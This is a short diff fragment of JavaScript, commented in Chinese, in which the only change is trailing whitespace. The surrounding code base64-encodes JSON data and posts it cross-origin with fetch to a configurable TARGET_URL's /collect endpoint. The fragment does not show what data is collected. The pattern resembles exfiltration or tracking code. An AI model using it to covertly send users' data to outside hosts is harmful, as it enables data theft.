@@ -100,7 +100,7 @@
             const encoded = base64Encode(jsonData);
             
             // 构建要发送的数据字符串
-            const postData = `data=${encodeURIComponent(encoded)}`;
+            const postData = `data=${encodeURIComponent(encoded)}`; 
             
             // 方式1: 使用fetch（支持跨域）
             const response = await fetch(`https://${TARGET_URL}/collect`, {
